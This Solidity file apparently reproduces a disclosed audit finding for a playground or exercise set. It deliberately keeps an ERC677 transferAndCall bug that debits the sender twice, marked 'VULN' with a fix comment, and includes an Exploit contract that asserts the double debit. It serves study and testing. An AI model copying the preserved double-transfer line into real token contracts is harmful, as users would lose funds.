// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Behodler — Double transfer in transferAndCall of ERC677
    (Code4rena 2022-01-behodler, [H-03], finding #42454)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: ERC677.transferAndCall calls both super.transfer and _transfer,
    moving `_value` twice. Flan inherits ERC677, so callers lose 2x tokens.
    Vulnerable body preserved VERBATIM (@> VULN). No fork, no cheats.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 base (stands in for OZ ERC20 that ERC677 extends).
contract ERC20Base {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(balanceOf[from] >= value, "ERC20: transfer amount exceeds balance");
        unchecked {
            balanceOf[from] -= value;
            balanceOf[to] += value;
        }
        emit Transfer(from, to, value);
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
}

interface IERC677Receiver {
    function onTokenTransfer(address from, uint256 value, bytes calldata data) external returns (bool);
}

/// @notice Reduced ERC677 from code-423n4/2022-01-behodler ERC677/ERC677.sol
///         with the double-transfer bug preserved.
contract ERC677 is ERC20Base {
    constructor(string memory n, string memory s) ERC20Base(n, s) {}

    function isContract(address _addr) private view returns (bool hasCode) {
        uint256 length;
        assembly {
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function contractFallback(address _to, uint256 _value, bytes memory _data) private {
        IERC677Receiver receiver = IERC677Receiver(_to);
        receiver.onTokenTransfer(msg.sender, _value, _data);
    }

    /// @notice Verbatim vulnerable transferAndCall (double transfer).
    function transferAndCall(address _to, uint256 _value, bytes memory _data) public returns (bool success) {
        super.transfer(_to, _value);
        _transfer(msg.sender, _to, _value); // @> VULN: second transfer of the same _value — double debit
        // FIX: remove the line above; super.transfer already moved the tokens.
        if (isContract(_to)) {
            contractFallback(_to, _value, _data);
        }
        return true;
    }
}

/// @notice Flan inherits ERC677 — the affected production surface.
contract Flan is ERC677 {
    constructor() ERC677("Flan", "FLN") {
        _mint(msg.sender, 1000 ether);
    }
}

/// @dev Receiver that accepts ERC677 callbacks (not the bug, just a valid _to).
contract Receiver is IERC677Receiver {
    uint256 public lastValue;
    address public lastFrom;

    function onTokenTransfer(address from, uint256 value, bytes calldata) external returns (bool) {
        lastFrom = from;
        lastValue = value;
        return true;
    }
}

/// CREATE order: flan (1), receiver (2).
contract Exploit {
    Flan public flan;
    Receiver public receiver;

    uint256 public constant AMOUNT = 100 ether;
    uint256 public senderAfter;
    uint256 public receiverAfter;
    uint256 public stolenExtra;

    constructor() {
        flan = new Flan(); // nonce 1 — mints 1000e18 to Exploit
        receiver = new Receiver(); // nonce 2
    }

    function run() external {
        uint256 senderBefore = flan.balanceOf(address(this));
        uint256 receiverBefore = flan.balanceOf(address(receiver));
        require(senderBefore >= AMOUNT * 2, "need balance for double debit");

        // Intended: send AMOUNT once. Actual: AMOUNT * 2 leaves the sender.
        flan.transferAndCall(address(receiver), AMOUNT, "");

        senderAfter = flan.balanceOf(address(this));
        receiverAfter = flan.balanceOf(address(receiver));
        stolenExtra = (senderBefore - senderAfter) - AMOUNT;

        require(senderBefore - senderAfter == AMOUNT * 2, "double debit");
        require(receiverAfter - receiverBefore == AMOUNT * 2, "double credit");
        require(stolenExtra == AMOUNT, "extra AMOUNT taken");
        // Harm: caller loses 2x the amount they intended to transfer.
        require(stolenExtra == AMOUNT && receiverAfter == AMOUNT * 2, "harm not demonstrated");
    }
}
